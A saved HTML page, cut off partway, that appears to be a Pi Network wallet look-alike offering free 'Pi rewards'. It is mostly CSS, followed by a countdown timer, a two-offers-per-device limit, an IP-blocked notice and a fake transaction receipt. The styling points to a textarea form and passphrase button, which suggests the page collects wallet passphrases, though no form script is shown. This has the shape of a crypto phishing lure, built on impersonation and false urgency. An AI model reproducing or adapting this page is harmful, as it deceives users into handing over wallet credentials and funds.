                    transform: translateY(100vh) translateX(0px);
                    opacity: 0;
                }
                10% {
                    opacity: 0.9;
                    transform: translateY(80vh) translateX(var(--float-distance));
                }
                50% {
                    transform: translateY(40vh) translateX(calc(var(--float-distance) * 1.5));
                }
                90% {
                    opacity: 0.9;
                    transform: translateY(10vh) translateX(var(--float-distance));
                }
                100% {
                    transform: translateY(-100px) translateX(var(--float-distance));
                    opacity: 0;
                }
            }

            /* Language chooser - enhanced */
            .language-chooser {
                position: fixed;
                bottom: 16px;
                right: 16px;
                display: flex;
                align-items: center;
                z-index: 60;
                background: rgba(255, 255, 255, 0.9);
                border-radius: 30px;
                padding: 6px 10px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
                backdrop-filter: blur(5px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                transition: all 0.3s ease;
            }

            .language-chooser:hover {
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
            }

            /* Language chooser positioning for mobile devices */
            @media (max-width: 640px) {
                .language-chooser {
                    bottom: 16px;
                    right: 16px;
                }
            }

            /* For very small screens */
            @media (max-width: 380px) {
                .language-chooser {
                    bottom: 10px;
                    right: 10px;
                    transform: scale(0.9);
                }

                .pi-header-content .flex.items-center {
                    transform: translateX(-15px); /* Move wallet text/icons slightly left */
                }
            }

            .language-option {
                display: flex;
                align-items: center;
                padding: 5px 10px;
                border-radius: 6px;
                cursor: pointer;
                color: rgba(0, 0, 0, 0.7);
                transition: all 0.2s ease;
                margin-left: 8px;
                font-size: 0.9rem;
                font-weight: 500;
            }

            .language-option:hover {
                color: #333;
                background-color: rgba(0, 0, 0, 0.1);
                transform: translateY(-1px);
            }

            .language-option.active {
                color: #fff;
                font-weight: bold;
                background-color: var(--pi-purple);
            }

            .language-option img {
                width: 18px;
                height: 18px;
                margin-right: 6px;
                border-radius: 2px;
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
            }

            /* Blocked IP notification - enhanced */
            .ip-blocked-message {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: rgba(0, 0, 0, 0.85);
                color: white;
                padding: 35px;
                border-radius: 12px;
                z-index: 2000;
                max-width: 90%;
                width: 420px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                backdrop-filter: blur(8px);
                display: none;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .ip-blocked-message h3 {
                color: #f44336;
                margin-bottom: 20px;
                font-size: 1.7rem;
                font-weight: 700;
            }

            .ip-blocked-message p {
                margin-bottom: 25px;
                line-height: 1.6;
                font-size: 1.1rem;
            }

            .ip-blocked-message button {
                background-color: #f44336;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 1rem;
                box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
            }

            .ip-blocked-message button:hover {
                background-color: #d32f2f;
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(244, 67, 54, 0.4);
            }

            /* IP location detection notification - enhanced */
            .location-detected {
                background: rgba(255, 255, 255, 0.97);
                color: #333;
                padding: 12px 20px;
                border-radius: 50px;
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%) translateY(20px);
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
                z-index: 100;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 0.9rem;
                max-width: 90%;
                opacity: 0;
                transition: opacity 0.3s ease, transform 0.3s ease;
                pointer-events: none;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }

            .location-detected.visible {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
                pointer-events: all;
            }

            .location-detected i {
                color: var(--pi-purple);
                margin-right: 8px;
            }

            .location-detected .country-flag {
                width: 22px;
                height: 22px;
                border-radius: 50%;
                margin-right: 10px;
                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            }

            /* Form page enhancements */
            #formPage {
                background-color: white !important;
                min-height: calc(100vh - 120px);
            }

            #formPage .pi-wallet-style {
                background-color: white;
                margin-top: 0;
            }

            #formPage .pi-title {
                color: #333;
                text-shadow: none;
                font-weight: 500;
                margin-top: 0; /* Giảm margin từ trên xuống */
                margin-bottom: 2rem;
            }

            #formPage .pi-info-text {
                color: #555;
                font-weight: 400; /* REDUCED from original */
            }

            #formPage .pi-input {
                color: #333;
                font-weight: 500;
            }

            #formPage .limit-message {
                background-color: #fff3cd;
                color: #856404;
            }

            #formPage .error-message {
                background-color: #f8d7da;
                color: #721c24;
            }

            /* Pending requests notification - enhanced */
            .pending-requests-badge {
                position: fixed;
                bottom: 70px;
                right: 16px;
                background: linear-gradient(135deg, #f44336, #ff8177);
                color: white;
                border-radius: 25px;
                padding: 8px 16px;
                font-size: 0.8rem;
                font-weight: bold;
                z-index: 100;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
                display: none;
                transform: translateY(0);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }

            .pending-requests-badge:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
            }

            /* Festive birthday elements */
            .birthday-badge {
                position: absolute;
                top: 10px;
                right: 10px;
                width: 60px;
                height: 60px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
                color: white;
                font-weight: bold;
                font-size: 0.8rem;
                padding: 5px;
                transform: rotate(15deg);
                z-index: 10;
            }

            .birthday-badge span:first-child {
                font-size: 1.2rem;
            }

            /* Success Modal Enhancements - Pi Transaction Style */
            #successModal {
                z-index: 2500;
            }

            #successModal .receipt-container {
                max-width: 400px;
                border-radius: 16px;
                overflow: hidden;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
                position: relative;
            }

            /* Highlight Important Note Effect */
            .modal-highlight-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.92); /* Color más oscuro */
                z-index: 2501;
                opacity: 0;
                transition: opacity 0.5s ease;
                pointer-events: none;
            }

            .modal-container {
                position: relative;
                z-index: 2502; /* Por encima del overlay */
            }

            .modal-highlight-active .modal-content-section {
                opacity: 0.2; /* Más atenuado */
                transition: opacity 0.5s ease;
                pointer-events: none;
                filter: grayscale(100%); /* Añadir efecto de escala de grises */
            }

            .modal-highlight-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }

            .highlight-important-note {
                position: relative;
                z-index: 2503;
                animation: pulse-highlight 2s infinite;
                box-shadow: 0 0 30px 15px rgba(255, 193, 7, 0.5); /* Sombra más pronunciada */
                transform: scale(1.05);
                transition: all 0.5s ease;
                opacity: 1 !important;
                pointer-events: auto !important;
                background-color: rgba(255, 248, 225, 1) !important; /* Fondo más brillante */
                border-color: #ffc107 !important; /* Borde más visible */
            }

            .highlight-important-note:before {
                content: "";
                position: absolute;
                top: -8px;
                left: -8px;
                right: -8px;
                bottom: -8px;
                border: 2px solid #ffc107;
                border-radius: 8px;
                animation: pulse-border 2s infinite;
                z-index: -1;
            }

            .understand-btn {
                display: inline-block;
                background-color: #ffc107;
                color: #333;
                font-weight: bold;
                padding: 8px 15px;
                border-radius: 4px;
                margin-top: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: none;
                text-transform: uppercase;
                font-size: 0.85rem;
                pointer-events: auto !important;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Sombra añadida para destacar el botón */
            }

            .modal-highlight-active {
                background-color: rgba(0, 0, 0, 0.95) !important; /* Fondo del modal más oscuro cuando está activo */
            }

            .understand-btn:hover {
                background-color: #ffd54f;
                transform: translateY(-2px);
            }

            /* Animaciones se mantienen igual */
            @keyframes pulse-highlight {
                0%,
                100% {
                    box-shadow: 0 0 20px 10px rgba(255, 193, 7, 0.2);
                }
                50% {
                    box-shadow: 0 0 25px 15px rgba(255, 193, 7, 0.4);
                }
            }

            @keyframes pulse-border {
                0%,
                100% {
                    opacity: 0.6;
                }
                50% {
                    opacity: 1;
                }
            }

            /* Transaction header styling */
            .transaction-header {
                background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
                padding: 20px;
                position: relative;
            }

            .transaction-amount {
                font-size: 2.5rem;
                font-weight: 700;
                color: white;
                text-align: center;
                margin: 10px 0;
            }

            .transaction-date {
                color: rgba(255, 255, 255, 0.8);
                text-align: center;
                font-size: 0.9rem;
            }

            .transaction-close-btn {
                position: absolute;
                top: 15px;
                right: 15px;
                color: white;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 50%;
                width: 30px;
                height: 30px;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
                transition: all 0.2s ease;
            }

            .transaction-close-btn:hover {
                background: rgba(255, 255, 255, 0.3);
                transform: scale(1.1);
            }

            .transaction-details {
                padding: 20px;
            }

            .transaction-detail-row {
                display: flex;
                justify-content: space-between;
                padding: 12px 0;
                border-bottom: 1px solid rgba(0, 0, 0, 0.1);
            }

            .transaction-detail-label {
                color: rgba(0, 0, 0, 0.6);
                font-weight: 500;
            }

            .transaction-detail-value {
                font-weight: 600;
            }

            /* Enhanced notification banner */
            .notification-banner {
                background: linear-gradient(to right, rgba(248, 192, 86, 0.95), rgba(230, 169, 56, 0.95));
                border-radius: 8px;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                margin: 0 auto 16px;
                max-width: 96%;
                padding: 12px 20px;
                font-weight: 500;
                color: #57401a;
                position: relative;
                border: 1px solid rgba(248, 192, 86, 0.3);
                overflow: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .notification-banner::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
            }

            .notification-banner p {
                margin: 0;
                position: relative;
                font-size: 0.95rem;
                line-height: 1.5;
                text-align: center;
            }

            .notification-banner i {
                margin-right: 10px;
                color: #57401a;
                font-size: 1.2rem;
            }

            @keyframes shimmer {
                0% {
                    transform: translateX(-100%);
                }
                100% {
                    transform: translateX(100%);
                }
            }

            /* Enhanced Animations */
            @keyframes shineIcon {
                0% {
                    transform: rotate(30deg) translateX(-100%);
                }
                100% {
                    transform: rotate(30deg) translateX(100%);
                }
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }

            @keyframes twinkle {
                0%,
                100% {
                    opacity: 0.2;
                    transform: scale(1);
                }
                50% {
                    opacity: 0.5;
                    transform: scale(1.2);
                }
            }

            @keyframes twinkleStar {
                0%,
                100% {
                    opacity: 0.4;
                    transform: scale(1);
                    filter: blur(0.5px);
                }
                50% {
                    opacity: 0.8;
                    transform: scale(1.3);
                    filter: blur(1px);
                }
            }

            @keyframes float {
                0% {
                    transform: translateY(0);
                }
                50% {
                    transform: translateY(-10px);
                }
                100% {
                    transform: translateY(0);
                }
            }

            @keyframes floatParticle {
                0% {
                    transform: translateY(0) rotate(0deg);
                }
                50% {
                    transform: translateY(-20px) rotate(180deg);
                }
                100% {
                    transform: translateY(0) rotate(360deg);
                }
            }

            @keyframes waveRotate {
                0% {
                    transform: translate(-50%, -50%) rotate(0deg);
                }
                100% {
                    transform: translate(-50%, -50%) rotate(360deg);
                }
            }

            @keyframes coinRotate {
                0% {
                    transform: rotateY(0deg);
                }
                100% {
                    transform: rotateY(360deg);
                }
            }

            @keyframes explode {
                0% {
                    opacity: 1;
                    transform: translate(0, 0) scale(1);
                }
                100% {
                    opacity: 0;
                    transform: translate(var(--tx), var(--ty)) scale(0);
                }
            }

            @keyframes lightStreak {
                0%,
                100% {
                    opacity: 0;
                    transform: rotate(45deg) translateX(-100px);
                }
                10%,
                90% {
                    opacity: 0.3;
                }
                50% {
                    transform: rotate(45deg) translateX(calc(100vw + 100px));
                }
            }

            /* Enhanced shooting star animation */
            @keyframes shootingStar {
                0% {
                    opacity: 0;
                    transform: translateX(0) translateY(0) scale(0.5);
                }
                10% {
                    opacity: 0.3;
                    transform: translateX(50px) translateY(50px) scale(0.7);
                }
                45% {
                    opacity: 1;
                    transform: translateX(150px) translateY(150px) scale(1);
                }
                70% {
                    opacity: 0.3;
                    transform: translateX(250px) translateY(250px) scale(0.7);
                }
                100% {
                    opacity: 0;
                    transform: translateX(300px) translateY(300px) scale(0.5);
                }
            }

            /* Enhanced card wave animation */
            @keyframes cardWave {
                0%,
                100% {
                    opacity: 0;
                    transform: translate(-25%, -25%) scale(0.1);
                }
                50% {
                    opacity: 0.4;
                    transform: translate(-25%, -25%) scale(1.8);
                }
            }

            /* Enhanced confetti animation */
            @keyframes confettiFall {
                0% {
                    opacity: 1;
                    transform: translateY(-10vh) rotate(0deg) scale(0.8);
                }
                50% {
                    opacity: 0.8;
                    transform: translateY(50vh) rotate(360deg) scale(1.2);
                }
                100% {
                    opacity: 0.2;
                    transform: translateY(100vh) rotate(720deg) scale(0.8);
                }
            }

            /* Enhanced shiny wave animation */
            @keyframes shinyWave {
                0% {
                    left: -100%;
                }
                100% {
                    left: 150%;
                }
            }

            /* Rotation animation */
            @keyframes rotate {
                0% {
                    transform: rotate(0deg);
                }
                100% {
                    transform: rotate(360deg);
                }
            }

            /* Countdown Timer Styles */
            .countdown-container div {
                position: relative;
                transition: all 0.2s ease;
            }

            .countdown-container div:not(:last-child)::after {
                content: ":";
                position: absolute;
                right: -12px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 24px;
                font-weight: bold;
                color: var(--pi-purple);
            }

            .countdown-container div > div:first-child {
                box-shadow: 0 8px 15px rgba(105, 57, 136, 0.3);
                position: relative;
                overflow: hidden;
                border-radius: 0.5rem;
            }

            .countdown-container div > div:first-child::after {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 2px;
                background: rgba(255, 255, 255, 0.5);
            }

            .countdown-pulse {
                animation: countdown-pulse 1s ease;
            }

            @keyframes countdown-pulse {
                0% {
                    transform: scale(1);
                }
                50% {
                    transform: scale(1.08);
                }
                100% {
                    transform: scale(1);
                }
            }

            .icon-header-main svg {
                color: #f8b85b;
                display: flex;
                align-items: center;
                margin-left: 10px;
            }

            .form-content {
                overflow-y: auto;
            }

            .pi-wallet-style {
                position: relative;
                z-index: 1;
            }

            /* General Reset */

            .app-container {
                max-width: 480px;
                margin: 0 auto;
                background: #fff;
                overflow: hidden;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            }

            /* Header */
            .header-main {
                background-color: #713d92;
                display: flex;
                flex-direction: row;
                justify-content: center;
                align-items: center;
                padding: 15px 20px;
                gap: 20px;
            }

            .header-main h1 {
                color: white;
                font-size: 20px;
                margin: 0;
                display: flex;
                align-items: center;
            }

            .header-main svg {
                color: #ffd700;
                display: flex;
                align-items: center;
            }

            /* Banner */
            .banner img {
                width: 100%;
                display: block;
            }

            /* Product Section */
            .products {
                max-width: 800px;
                align-items: center;
            }

            .products h2 {
                font-size: 18px;
                font-weight: 600;
                color: #ffffff;
                margin-bottom: 15px;
            }

            .product-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }

            .product-card {
                background: #fff;
                border: 1px solid #ddd;
                border-radius: 10px;
                text-align: center;
                padding: 15px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }

            .product-card img {
                width: 100%;
                max-width: 130px;
                margin: 0 auto 10px;
                display: block;
            }

            .price {
                margin: 0px 0;
            }

            .current-price {
                font-weight: bold;
                color: #713d92;
                margin-right: 5px;
            }

            .original-price {
                text-decoration: line-through;
                color: #999;
            }

            .product-name {
                font-size: 15px;
                font-weight: 500;
                color: #272727;
                margin-bottom: 10px;
            }

            .buy-now {
                background: #713d92;
                color: #fff;
                border: none;
                border-radius: 5px;
                padding: 5px 20px;
                font-size: 15px;
                cursor: pointer;
                transition: background 0.3s ease;
                text-decoration: none;
            }
            .buy-now:hover {
                background: #5311a8;
            }

            /* Hide the app container on larger screens */
            .app-container {
                display: block;
            }

            /* Desktop fallback message */
            .desktop-message {
                display: none;
                text-align: center;
                font-family: "Arial", sans-serif;
                padding: 50px;
                background-color: #f5f5f5;
                color: #333;
                font-size: 18px;
            }

            .header h1 {
                font-size: 20px;
                color: white;
            }

            .back-arrow,
            .wallet-icon {
                font-size: 18px;
            }

            /* Main Content */
            main {
                padding: 20px;
            }

            h2 {
                text-align: center;
                font-size: 22px;
                margin-bottom: 20px;
            }

            .input-container {
                position: relative;
                margin-bottom: 15px;
            }

            textarea {
                width: 100%;
                height: 120px;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
                resize: none;
            }

            textarea:focus {
                outline: none;
                border-color: #713d92;
            }

            .error-message {
                display: none;
                color: #d9534f;
                font-size: 14px;
                margin-top: 5px;
            }

            /* Buttons */
            .btn {
                display: block;
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                text-align: center;
                font-size: 16px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                transition: background 0.3s ease;
            }

            /* Remove unused button styles */
            .btn-passphrase,
            .btn-faceid,
            .btn-passphrase:hover,
            .btn-faceid:hover {
                display: none;
            }

            /* Remove unused info text styles */
            .info-text,
            .info-text a,
            .info-text a:hover {
                display: none;
            }

            /* Remove unused center logo styles */
            .center-logo {
                display: none;
            }
        </style>
        
    <script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script></head>
    <body __processed_bd9dee7e-ac45-41d7-9f71-49c007566422__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMjB9XQ==">
        <!-- Premium Background Elements - With optimized shooting stars -->
        <div class="premium-bg" bis_skin_checked="1">
            <div class="animated-gradient" bis_skin_checked="1"></div>
            <div class="wave-container" bis_skin_checked="1">
                <div class="wave wave1" bis_skin_checked="1"></div>
                <div class="wave wave2" bis_skin_checked="1"></div>
                <div class="wave wave3" bis_skin_checked="1"></div>
            </div>
            <div id="starsContainer" bis_skin_checked="1"><div class="star" bis_skin_checked="1" style="width: 2.54987px; height: 2.54987px; left: 42.9078%; top: 17.2042%; animation-delay: 0.390352s;"></div><div class="star" bis_skin_checked="1" style="width: 3.07571px; height: 3.07571px; left: 11.153%; top: 22.1077%; animation-delay: 1.84855s;"></div><div class="star" bis_skin_checked="1" style="width: 1.14656px; height: 1.14656px; left: 17.0719%; top: 45.474%; animation-delay: 0.0610253s;"></div><div class="star" bis_skin_checked="1" style="width: 3.93299px; height: 3.93299px; left: 49.4695%; top: 42.4861%; animation-delay: 1.25528s;"></div><div class="star" bis_skin_checked="1" style="width: 1.08462px; height: 1.08462px; left: 90.257%; top: 3.14504%; animation-delay: 1.58142s;"></div></div>
            <div id="singleStarsContainer" bis_skin_checked="1"><div class="star-single" bis_skin_checked="1" style="left: 69.9627%; top: 61.192%; animation-delay: 1.49362s;"></div></div>
            <div id="shootingStarsContainer" bis_skin_checked="1"></div>
            <div id="particlesContainer" bis_skin_checked="1"></div>
            <div id="coinsContainer" bis_skin_checked="1"><div class="premium-coin" bis_skin_checked="1" style="width: 40.0783px; height: 40.0783px; left: 15%; top: 15%; animation: 10s ease-in-out 0s infinite normal none running float; opacity: 0.4;"><img src="./index.php_files/favicon42527eabc5bda97a.png" style="width: 100%; height: 100%; object-fit: contain; border-radius: 50%;"></div><div class="premium-coin" bis_skin_checked="1" style="width: 32.1784px; height: 32.1784px; left: 85%; top: 15%; animation: 10s ease-in-out 0s infinite normal none running float; opacity: 0.4;"><img src="./index.php_files/favicon42527eabc5bda97a.png" style="width: 100%; height: 100%; object-fit: contain; border-radius: 50%;"></div></div>
            <div id="lightStreaksContainer" bis_skin_checked="1"><div class="light-streak" bis_skin_checked="1" style="top: 50%; animation-delay: 0s;"></div></div>
        </div>

        <!-- Loading Overlay -->
        <div id="loadingOverlay" class="loading-overlay" bis_skin_checked="1">
            <div class="loading-content" bis_skin_checked="1">
                <div class="loading-spinner" bis_skin_checked="1"></div>
                <div class="loading-text" bis_skin_checked="1">Loading...</div>
            </div>
        </div>

        <!-- IP Blocked Message -->
        <div id="ipBlockedMessage" class="ip-blocked-message" bis_skin_checked="1">
            <h3 data-en="Access Denied">
                Access Denied
            </h3>
            <p data-en="Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.">
                Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.
            </p>
            <button id="closeBlockedMessage" data-en="Close">
                Close
            </button>
        </div>

        <!-- Pending Requests Badge -->
        <div id="pendingRequestsBadge" class="pending-requests-badge" bis_skin_checked="1" style="display: none;">
            <span data-en="Pending: ">Pending: </span>
            <span id="pendingCount">0</span>
        </div>

        <!-- Pi Wallet Header -->
        <header class="pi-header">
            <div class="pi-header-content" bis_skin_checked="1">
                <button class="header-back-btn" id="headerBackBtn" style="visibility: hidden;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M15 18l-6-6 6-6"></path>
                    </svg>
                </button>

                <div class="flex items-center" bis_skin_checked="1">
                    <div class="icon-header-main" style="padding-top: 26%; padding-right: 5px;" bis_skin_checked="1">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 1024 1024" fill="none" class="mb-10 text-primary-500">
                            <path stroke="currentColor" stroke-width="50" d="M780.506 341.544v-11.073c0-45.478-37-82.46-82.5-82.46h-412.5c-45.49 0-82.5 36.982-82.5 82.46V701.54c0 45.478 37.01 82.46 82.5 82.46h453.75c45.5 0 82.5-36.982 82.5-82.46V412.931c0-30.46-16.617-57.114-41.25-71.387Z"></path>
                            <path fill="currentColor" d="M797 360.758v11.182c-12.154-7.037-42.642-16.564-57.693-16.564H306.605c-11.329 0-20.605-9.321-20.605-20.704 0-11.383 9.276-20.704 20.605-20.704h432.702c11.127 0 22.054 1.456 32.356 4.347 5.755 11.181 25.337 29.2 25.337 42.443ZM717.796 429.502c-65.52 0-118.8 51.8-118.8 115.5s53.28 115.5 118.8 115.5h112.2v-231h-112.2Z"></path>
                            <circle cx="706.74" cy="545.002" r="49.5"></circle>
                            <path fill="currentColor" d="M364.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082ZM430.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082Z"></path>
                            <path fill="currentColor" d="M364.714 515.357V660.5l38.5-14.692V515.357h27.5V660.5l38.5-14.692V515.357h25.581c21.107 0 38.219-17.143 38.219-38.289v-21.396h-38.219v21.396H340.233c-21.108 0-38.219 17.143-38.219 38.289v26.464h38.219v-26.464h24.481Z"></path>
                            <defs>
                                <clippath id="a"><path fill="#fff" d="M177.5 182h669v660h-669z"></path></clippath>
                            </defs>
                        </svg>
                    </div>
                    <span class="wallet-text">Wallet</span>
                    <div class="icon-header-main" bis_skin_checked="1">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" fill="none" width="20" height="20" class="text-secondary-500">
                            <path fill="currentColor" d="M94.91 66.314c0-1.078.875-1.953 1.954-1.953h18.878c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953H96.863a1.953 1.953 0 0 1-1.953-1.953V66.314ZM133.97 66.314c0-1.078.875-1.953 1.953-1.953h18.879c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953h-18.879a1.953 1.953 0 0 1-1.953-1.953V66.314Z"></path>
                            <path fill="currentColor" d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"></path>
                            <path fill="currentColor" fill-rule="evenodd" d="M130.122 20.75c-60.368 0-109.305 48.937-109.305 109.305 0 60.367 48.937 109.305 109.305 109.305 60.367 0 109.305-48.938 109.305-109.305 0-60.368-48.938-109.305-109.305-109.305ZM.943 130.055C.943 58.711 58.778.875 130.122.875c71.343 0 129.178 57.836 129.178 129.18 0 71.343-57.835 129.178-129.178 129.178C58.778 259.233.943 201.398.943 130.055Z" clip-rule="evenodd"></path>
                        </svg>
                    </div>
                </div>

            </div>
        </header>

        <!-- Main Content -->
        <div class="page-container" bis_skin_checked="1">
            <!-- Home Page -->
            <div id="homePage" class="page page-active" style="padding-top: 50px;" bis_skin_checked="1">
                <!-- Hero Section -->
                <section class="text-center relative">
                    <i class="fas fa-star floating-icon" style="top: 10%; right: 10%; opacity: 0.3;"></i>
                    <i class="fas fa-coins floating-icon" style="bottom: 20%; left: 5%; opacity: 0.3;"></i>

                    <p class="text-4xl font-bold inline-block relative animate-on-scroll animated" data-en="Receive Pi Network Rewards">
                        Receive Pi Offer
                    </p>
                    <p class="p-5 text-lg max-w-2xl mx-auto animate-on-scroll animated" data-delay="200" data-en="Join the special promotion! Limited time offer for the Pi Network community.">
                        Join the special promotion! Limited time offer for the Pi Network community. Each device is limited to a maximum of 2 offers.
                    </p>

                    <!-- Countdown Timer - Moved under button -->
                    <div class="max-w-md mx-auto mt-6 mb-8 animate-on-scroll animated" data-delay="100" bis_skin_checked="1">
                        <div class="card m-5 p-4 text-center shadow-lg border-2 border-purple-200 dark:border-purple-900" bis_skin_checked="1">
                            <h4 class="text-lg font-bold mb-2" data-en="Event ends in">
                                Event ends in
                            </h4>
                            <div class="flex justify-center space-x-4 countdown-container" bis_skin_checked="1">
                                <div class="text-center" bis_skin_checked="1">
                                    <div class="bg-purple-700 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-days" bis_skin_checked="1">02</div>
                                    <div class="mt-1 text-sm" data-en="Days" bis_skin_checked="1">
                                        Days
                                    </div>
                                </div>
                                <div class="text-center" bis_skin_checked="1">
                                    <div class="bg-purple-600 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-hours" bis_skin_checked="1">23</div>
                                    <div class="mt-1 text-sm" data-en="Hours" bis_skin_checked="1">
                                        Hours
                                    </div>
                                </div>
                                <div class="text-center" bis_skin_checked="1">
                                    <div class="bg-purple-500 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-minutes" bis_skin_checked="1">48</div>
                                    <div class="mt-1 text-sm" data-en="Minutes" bis_skin_checked="1">
                                        Minutes
                                    </div>
                                </div>
                                <div class="text-center" bis_skin_checked="1">
